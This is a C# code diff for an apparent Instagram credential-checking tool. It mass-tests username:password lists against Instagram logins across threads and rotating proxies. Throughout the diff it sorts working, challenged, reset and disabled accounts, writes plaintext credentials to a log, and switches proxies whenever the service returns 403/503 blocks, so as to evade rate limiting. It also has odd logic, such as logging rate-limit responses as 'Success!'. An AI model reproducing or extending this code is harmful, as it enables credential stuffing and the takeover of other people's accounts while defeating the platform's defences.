@@ -30,9 +30,14 @@ namespace Instagram_Checker.BLL
         public bool IsObjectsReady { get; private set; }
         public bool IsProxyInited { get; private set; }
         public bool IsMailsReady { get; private set; }
+        public int ProxySwitched { get; private set; }
+        public int ProxyBlocked { get; private set; }
+        public int AccsSwitched { get; private set; }
+        public int AccsBlocked { get; private set; }
 
         public bool NeedMoreProxy { get; set; }
-        
+
+
         public List<string> AccountInfoDataSet_Required { get; private set; }
         public List<string> AccountInfoDataSet_Success { get; private set; }
 
@@ -42,13 +47,17 @@ namespace Instagram_Checker.BLL
 
         public Model()
         {
-            IsProxyInited = false;
-            IsAccountInited = false;
-            IsObjectsReady = false;
+            AccsBlocked = 0;
+            ProxyBlocked = 0;
+            AccsSwitched = 0;
+            ProxySwitched = 0;
             IsMailsReady = false;
+            IsProxyInited = false;
+            IsObjectsReady = false;
+            IsAccountInited = false;
             IsProgramComplitlyEnded = false;
-            AccountInfoDataSet_Required = new List<string>();
             AccountInfoDataSet_Success = new List<string>();
+            AccountInfoDataSet_Required = new List<string>();
 
             _proxy = new Proxy();
             _account = new Accounts();
@@ -74,13 +83,13 @@ namespace Instagram_Checker.BLL
             worker.RunWorkerAsync(objs);
         }
 
-        public void InitObjects()
+        public void InitObjects(int countThreads, int splitCount)
         {
             BackgroundWorker worker = new BackgroundWorker();
             worker.DoWork += InitObjects_DoWork;
             worker.RunWorkerCompleted += InitObjects_RunWorkerCompleted;
 
-            object[] objs = new object[2] { _account.Users, _proxy.InstaProxies };
+            object[] objs = new object[4] { _account.Users, _proxy.InstaProxies, countThreads, splitCount };
             worker.RunWorkerAsync(objs);
         }
 
@@ -103,7 +112,7 @@ namespace Instagram_Checker.BLL
         }
 
 
-        public void CheckAllAccounts()
+        public void CheckAllAccounts(int delay)
         {
             int pos = 0;
             var proxy = _proxy.InstaProxies;
@@ -114,13 +123,12 @@ namespace Instagram_Checker.BLL
 
                 try
                 {
-                    object[] options = new object[] { _objectsInstaProx[pos], obj };
+                    object[] options = new object[] { _objectsInstaProx[pos], obj, delay };
                     worker.RunWorkerAsync(options);
                     pos++;
                 }
                 catch { break; }
             }
-            logging.Invoke(LogIO.path, new Log() { UserName = null, Date = DateTime.Now, LogMessage = $"Выделено потоков: {pos + 1}", Method = "Model.CheckInsta.InitThreads" });
         }
 
         #region BackgroundMethods
@@ -129,6 +137,7 @@ namespace Instagram_Checker.BLL
             object[] arg = (object[])e.Argument;
             List<Dictionary<string, object>> proxyOptions = (List<Dictionary<string, object>>)arg[0];
             List<Dictionary<string, string>> instOptions = (List<Dictionary<string, string>>)arg[1];
+            int delay = (int)arg[2];
 
             if (proxyOptions[0] == null || instOptions[0] == null)
                 return;
@@ -145,14 +154,14 @@ namespace Instagram_Checker.BLL
                 IResult<InstaLoginResult> result = null;
                 try
                 {
-                    result = await android.Login(instOptions[i]["instaLogin"], instOptions[i]["instaPassword"],
+                    result = await android.Login(delay, instOptions[i]["instaLogin"], instOptions[i]["instaPassword"],
                         proxyOptions[proxyPos]["ip"].ToString(), Int32.Parse(proxyOptions[proxyPos]["port"].ToString()), proxyOptions[proxyPos]["proxyLogin"].ToString(), proxyOptions[proxyPos]["proxyPassword"].ToString());
                 }
                 catch
                 {
                     try
                     {
-                        result = await android.Login(instOptions[i]["instaLogin"], instOptions[i]["instaPassword"],
+                        result = await android.Login(delay, instOptions[i]["instaLogin"], instOptions[i]["instaPassword"],
                             proxyOptions[proxyPos]["ip"].ToString(), Int32.Parse(proxyOptions[proxyPos]["port"].ToString()));
                     }
                     catch (Exception ex)
@@ -191,23 +200,43 @@ namespace Instagram_Checker.BLL
                     }
                     if (result.Info.Message == "Please wait a few minutes before you try again.")
                     {
+                        logging.Invoke("EasyLog.log", new Log() { UserName = $"{android.UserSession.UserName}:{android.UserSession.Password}", Date = DateTime.Now, LogMessage = $"Success! Аккаунт успешно залогинен", Method = "Model.CheckInsta" });
                         Thread.Sleep(30000);
                         i--;
+                    }
+                    if (result.Info.Message == "To secure your account, we've reset your password. Tap \"Get help signing in\" on the login screen and follow the instructions to access your account.")
+                    {
+                        Random rand = new Random();
+                        if (Randomer.Next(1, 3) == 1)
+                            AccountInfoDataSet_Success.Add(android.UserSession.UserName + ":" + android.UserSession.Password + ":" + "empty" + ":" + "empty");
+                    }
+                    if (result.Info.Message == "Your account has been disabled for violating our terms. Learn how you may be able to restore your account.")
+                    {
+                        logging.Invoke("EasyLog.log", new Log() { UserName = $"{android.UserSession.UserName}:{android.UserSession.Password}", Date = DateTime.Now, LogMessage = $"Block! Аккаунт заблокирован в следствие преувелечения полномочиями сервиса", Method = "Model.CheckInsta" });
+                        AccsBlocked++;
                     }
                     logging.Invoke(LogIO.path, new Log() { UserName = null, Date = DateTime.Now, LogMessage = $"Success! {result.Info.Message} - {result.Succeeded}", Method = "Model.CheckInsta" });
                 }
                 else if (result.Value.ToString() == "ChallengeRequired")
                 {
                     logging.Invoke(LogIO.path, new Log() { UserName = null, Date = DateTime.Now, LogMessage = $"Challenge required! {result.Info.Message} - {result.Succeeded}", Method = "Model.CheckInsta" });
+                    //var res = await android.Verify_Login();
                     lock (locker)
                     {
                         AccountInfoDataSet_Required.Add(android.UserSession.UserName + ":" + android.UserSession.Password);
                     }
                 }
-                else if (result.Info.Message == "Произошла ошибка при отправке запроса.")
+                else if (result.Info.Message == "Произошла ошибка при отправке запроса." || result.Info.Message == "An error occurred while sending the request.")
                 {
+                    if (result.Info.Exception.InnerException.Message.Contains("403") || result.Info.Exception.InnerException.Message.Contains("503"))
+                    {
+                        ProxyBlocked++;
+                        logging.Invoke("EasyLog.log", new Log() { UserName = null, Date = DateTime.Now, LogMessage = $"Sentry block! Смена прокси...", Method = "Model.CheckInsta" });
+                    }
                     logging.Invoke(LogIO.path, new Log() { UserName = null, Date = DateTime.Now, LogMessage = $"Ошибка при отправке запроса! {result.Info.Message} - {result.Succeeded}", Method = "Model.CheckInsta" });
                     proxyPos++;
+                    ProxySwitched++;
+                    checkPos = 0;
                     i--;
                 }
                 else
@@ -215,9 +244,13 @@ namespace Instagram_Checker.BLL
                     logging.Invoke(LogIO.path, new Log() { UserName = null, Date = DateTime.Now, LogMessage = $"{result.Value}! {result.Info.Message} - {result.Succeeded}", Method = "Model.CheckInsta" });
                 }
                 checkPos++;
+                AccsSwitched++;
 
                 if (checkPos % 10 == 0)
+                {
+                    ProxySwitched++;
                     proxyPos++;
+                }
             }
         }
 
@@ -244,13 +277,14 @@ namespace Instagram_Checker.BLL
 
             var usrs = _account.Users;
             var instProxy = _proxy.InstaProxies;
-            int count = usrs.Count / 10000;
+            int count = (int)((object[])e.Argument)[2];
 
             _objectsInstaLogs = new List<object>();
             _objectsInstaProx = new List<object>();
 
+            int initMaxPos = (int)((object[])e.Argument)[3];
             int pos = 0;
-            int maxPos = 10000;
+            int maxPos = initMaxPos;
             for (int i = 0; i < count; i++)
             {
                 bool check = false;
@@ -268,8 +302,8 @@ namespace Instagram_Checker.BLL
                     _objectsInstaLogs.Add(forObj);
                 if (check)
                     break;
-                pos += 10000;
-                maxPos += 10000;
+                pos += initMaxPos;
+                maxPos += initMaxPos;
             }
 
             int countProx = instProxy.Count / _objectsInstaLogs.Count;
